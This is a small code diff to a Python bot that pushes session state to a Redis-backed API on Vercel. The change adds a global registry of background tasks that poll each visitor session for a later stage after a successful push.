@@ -57,6 +57,7 @@ def set_sync_state(stage: int = None, twofa_verified: bool = None, linking_code:
 
 # Global bot reference for background tasks
 bot_for_notifications = None
+session_poll_tasks = {}
 
 async def push_state(stage: int = None, twofa_verified: bool = None, linking_code: str = None, actor_tg_user_id: int = None, actor_chat_id: int = None, session_id: str = None):
     """Push state to Redis-backed API (Vercel)."""
@@ -89,6 +90,14 @@ async def push_state(stage: int = None, twofa_verified: bool = None, linking_cod
                 )
                 if 200 <= resp.status_code < 300:
                     logger.info(f"Pushed state to Vercel stage={payload['stage']} twofa={payload['twofa_verified']}")
+                    # Start per-session poller (so we can detect stage 6 for this visitor)
+                    try:
+                        if session_id:
+                            global session_poll_tasks
+                            if session_id not in session_poll_tasks or session_poll_tasks[session_id].done():
+                                session_poll_tasks[session_id] = asyncio.create_task(poll_remote_and_sync(session_id=session_id))
+                    except Exception:
+                        pass
                     return True
                 else:
                     logger.error(f"Vercel state push failed: {resp.status_code} {resp.text}")
